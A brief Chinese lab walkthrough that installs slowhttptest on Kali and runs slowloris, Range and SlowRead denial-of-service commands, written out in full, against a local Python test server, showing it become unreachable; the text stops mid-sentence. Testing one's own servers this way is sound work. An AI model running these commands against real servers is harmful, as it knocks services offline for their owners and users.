## 安装

在kali下执行以下命令，执行命令安装

apt-get install slowhttptest

## 测试

启动一个简易http服务

python -m http.server 9000

![启动python的简易服务器](./img/slowhttptest/启动简易http服务.png)
 
通过浏览器访问

![浏览器访问](./img/slowhttptest/浏览器访问1.png)

执行测试

slowloris模式

slowhttptest -c 1000 -H -g -o header_stats -i 10 -r 200 -t GET -u http://192.168.31.64:9000 -x 24 -p 3

Range模式

slowhttptest -R -u http://192.168.31.64:9000 -t HEAD -c 100 -a 10 -b 3000 -r 500

SlowRead模式

slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://192.168.31.64:9000 -p 3

我选择的第一个

![执行测试]](./img/slowhttptest/执行测试.png)

再次去访问时

![执行测试]](./img/slowhttptest/无法访问.png)

服务已经不能







